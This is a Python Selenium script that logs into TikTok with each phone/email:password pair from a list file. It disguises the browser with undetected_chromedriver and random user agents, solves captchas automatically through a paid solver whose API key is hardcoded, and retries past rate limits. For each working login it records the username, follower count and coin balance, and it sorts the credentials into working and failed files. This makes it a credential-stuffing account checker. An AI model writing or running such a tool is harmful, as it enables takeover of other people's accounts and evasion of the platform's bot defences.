from tiktok_captcha_solver import SeleniumSolver
import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from fake_useragent import UserAgent
import phonenumbers
import time
from bs4 import BeautifulSoup
from colorama import Fore , init
from phonenumbers import geocoder
import threading
get_account = threading.Lock()
lock_account = threading.Lock()
class handle_files:
    @staticmethod
    def read_account():
        with get_account:
            accounts = open('data.txt', 'r').read().splitlines()
            if accounts:
                return accounts[0]
            return None  # Return None if the file is empty
            
    @staticmethod
    def remove_processed_account():
        with lock_account:
            accounts = open('data.txt', 'r').read().splitlines()
            if accounts:
                with open('data.txt', 'w') as f:
                    for acc in accounts[1:]:  # Skip the first account
                        f.write(f'{acc}\n')

    @staticmethod
    def save_account(file_name,account=None,data=None):
        with lock_account:
            with open(f'{file_name}.txt','a') as f:
                if account:
                    f.write(f'{account}\n')
                elif data:
                    f.write(f'{data}\n')

class TikTok_BOT(handle_files):
    def __init__(self):
        super().__init__()
        self.api_key = '790e7f933f1e6619ce5310b7fcbd6362'

    def start(self):
        self.driver = self.setup_browser()
        with open('data.txt', 'r') as f:
          num_lines = len(f.readlines())
        for i in range(num_lines):
            try:
                account = self.read_account()
                if not account:  # If no accounts are left, stop the process
                  print("No accounts left to process.")
                  break
                if ':' in account:
                    self.email , self.password = account.split(':')
                elif '|' in account:
                    self.email , self.password = account.split('|')
                self.driver.set_window_size(1920 // 2, 1080 // 2)
                response = self.handle_login(self.email,self.password)
                if response:
                    r = self.check_login()
                    if r:
                        res = self.extract_profile_data()
                        result = f'{self.email}|{self.password}|{res}'
                        print(f'[{Fore.GREEN}+{Fore.RESET}] {Fore.CYAN}Success Save Result{Fore.RESET} [ {Fore.BLUE}{result}{Fore.RESET} ]')
                        self.save_account('result',data=result)
                        self.logout()
                    else:
                        self.save_account('corrupted_accounts',account=f'{self.email}:{self.password}')
                    self.remove_processed_account()
                    print('*'*50)
                else:
                    print(f"Failed to handle login for account: {self.email}")
            except Exception as e:
                print(e)
        input('Press anykey..')
        self.driver.quit()

    def setup_browser(self):
        user_agent = UserAgent().random
        options = uc.ChromeOptions()
        options.add_argument(f"user-agent={user_agent}")
        # options.add_argument(f"--proxy-server={proxy}")
        self.driver = uc.Chrome(options=options)
        self.solver = SeleniumSolver(
            self.driver,
            self.api_key,
            mouse_step_size=1,
            mouse_step_delay_ms=20)
        return self.driver
    
    def handle_login(self,phone_number, password):
      max_retries = 3  # Maximum number of retries
      for attempt in range(max_retries):
        try:
            print(f"[{Fore.YELLOW}*{Fore.RESET}] Attempting login (Attempt {attempt + 1}/{max_retries})...")
            parsed_number = phonenumbers.parse(phone_number, None)
            country_code = f"+{parsed_number.country_code}"
            country_name_full = geocoder.country_name_for_number(parsed_number, "en")
            local_number = phone_number.replace(country_code, "").lstrip("0")
            self.driver.get("https://www.tiktok.com/login")
            WebDriverWait(self.driver, 10).until(
                EC.element_to_be_clickable((By.XPATH, "//div[contains(text(), 'Use phone / email / username')]"))
            ).click()
            WebDriverWait(self.driver, 10).until(
                EC.element_to_be_clickable((By.LINK_TEXT, "Log in with password"))
            ).click()

            WebDriverWait(self.driver, 10).until(
                EC.element_to_be_clickable((By.XPATH, "//div[contains(@aria-label, '+')]"))
            ).click()
            search_input = WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located((By.ID, "login-phone-search")))
            
            for char in country_name_full:
                search_input.send_keys(char)

            WebDriverWait(self.driver, 10).until(
            EC.element_to_be_clickable((By.XPATH, f"//span[contains(text(), '{country_name_full}')]"))).click()

            mobile_input = WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located((By.NAME, "mobile")))

            
            for char in local_number:
                mobile_input.send_keys(char)

            password_input = WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located((By.XPATH, "//input[@type='password']")))
            
            for char in password:
                password_input.send_keys(char)
            login_button = self.driver.find_element(By.XPATH, "//button[contains(text(), 'Log in')]")
            login_button.click()
            print(f"[{Fore.GREEN}+{Fore.RESET}] {Fore.CYAN}Login attempt successful.{Fore.RESET}")
            return True  

        except Exception as e:
            print(f"[{Fore.RED}-{Fore.RESET}] {Fore.YELLOW}Login attempt failed (Attempt {attempt + 1}/{max_retries}).{Fore.RESET}")
            time.sleep(3)  # Wait before retrying
      # If all retries fail, log the failure
      print(f"[{Fore.RED}-{Fore.RESET}] {Fore.RED}Failed to log in after {max_retries} attempts for {phone_number}.{Fore.RESET}")
      return False
            

    def check_login(self):
        retry_count = 0
        max_retries = 10 
        login_successful = False
        time.sleep(3)
        while retry_count < max_retries:
            try:
                if retry_count != 0:
                    login_button = self.driver.find_element(By.XPATH, "//button[contains(text(), 'Log in')]")
                    login_button.click()
                try:
                    self.driver.find_element(By.XPATH, '//*[@id=":r2:"]')
                    return self.solve_captcha()
                except:
                    pass
                error_message = WebDriverWait(self.driver, 5).until(
                    EC.presence_of_element_located((By.XPATH, '//*[@id="loginContainer"]/div[1]/form/div[4]'))).text
                if 'logged in' in error_message.lower():
                    print(f'[{Fore.GREEN}+{Fore.RESET}]{Fore.GREEN} Login Success{Fore.RESET} [{Fore.YELLOW}{self.email}{Fore.RESET}]')
                    login_successful = True
                    return True
                if "number of attempts" in error_message.lower():
                    if retry_count == 0:
                        print(f"[{Fore.RED}-{Fore.RESET}]{Fore.RED} Exceeded login attempts{Fore.RESET}.... (Retry{Fore.RESET} {retry_count + 1}/{max_retries}) - [{Fore.LIGHTBLUE_EX}{self.email}{Fore.RESET}]")
                    time.sleep(3)
                    retry_count = retry_count + 1
                elif 'incorrect password' in error_message.lower() or 'incorrect' in error_message.lower() :
                    print(f"[{Fore.RED}-{Fore.RESET}] {Fore.RED}Incorrect Password{Fore.RESET}... [{Fore.RED}{self.email}{Fore.RESET}]")
                    return 0
                else:
                    if '/explore?lang=en' in self.driver.page_source:
                        print('[Login SUccessful...]')
                        login_successful = True
                        break 
            except Exception as e:
                try:
                    ''' Find Check Captcha '''
                    self.driver.find_element(By.XPATH, '//*[@id=":r2:"]')
                    return self.solve_captcha()
                except:
                    pass
                if '/explore?lang=en' in self.driver.page_source:
                    print(f'[{Fore.GREEN}+{Fore.RESET}]{Fore.GREEN} Login Success{Fore.RESET} [{Fore.YELLOW}{self.email}{Fore.RESET}]')
                    login_successful = True
                    return True
        print(f"[{Fore.RED}-{Fore.RESET}]{Fore.RED} Failed To login {Fore.RESET}- Attempts Finished [ {Fore.RED}{self.email}{Fore.RESET} ]")
        return login_successful

    def solve_captcha(self):
        while True:
            try:
                self.solver.solve_captcha_if_present()
                print(f"[{Fore.GREEN}+{Fore.RESET}] {Fore.LIGHTCYAN_EX}Success Bypass Captcha.{Fore.RESET}")
                return self.check_login()
            except Exception as e:
                print(f"Captcha solving failed: {e}")
                time.sleep(3)

    def logout(self):
        try:
            self.driver.get("https://www.tiktok.com/logout")
            try:
                WebDriverWait(self.driver, 2).until(
                    EC.presence_of_element_located((By.XPATH, "//div[contains(text(), 'Log out')]"))
                ).click()
            except:
                pass
            print(f"[{Fore.RED}-{Fore.RESET}] {Fore.LIGHTYELLOW_EX}Logged out successfully..{Fore.RESET} [{Fore.RED}{self.email}{Fore.RESET}]{Fore.RESET}")
            return True
        except Exception as e:
            print(f"Error during logout: {e}")
    
    def extract_profile_data(self):
      """Extracts and saves profile data after successful login."""
      try:
          time.sleep(3)
          # Extract username
          soup = BeautifulSoup(self.driver.page_source, 'html.parser')
          username = soup.find('a', {'data-e2e': 'nav-profile'})['href']
          profile_link = 'https://www.tiktok.com/' + soup.find('a', {'data-e2e': 'nav-profile'})['href']
          if '@' in username: 
              username = username.split('?')[0].strip('/@')

          # Navigate to the coins page
          self.driver.get("https://www.tiktok.com/coin?enter_from=web_main_nav&lang=en")

          # Wait in a loop until the required element is found
          coins = None
          start_time = 0
          end_time = 30
          while end_time > start_time:
              try:
                  soup = BeautifulSoup(self.driver.page_source, 'html.parser')
                  coins = soup.find('span', {'data-e2e': 'wallet-coins-balance'}).text
                  break  # Exit loop if successful
              except Exception:
                  print("Waiting for coins element...")

          # Proceed to extract followers data
          self.driver.get(profile_link)
          time.sleep(2)
          soup = BeautifulSoup(self.driver.page_source, 'html.parser')
          follower = soup.find('strong', {'data-e2e': 'followers-count'}).text
          
          return f'{username}|{follower}|{coins}'
      except Exception as e:
          print(f"Error extracting profile data: {e}")

x = TikTok_BOT()
x.start()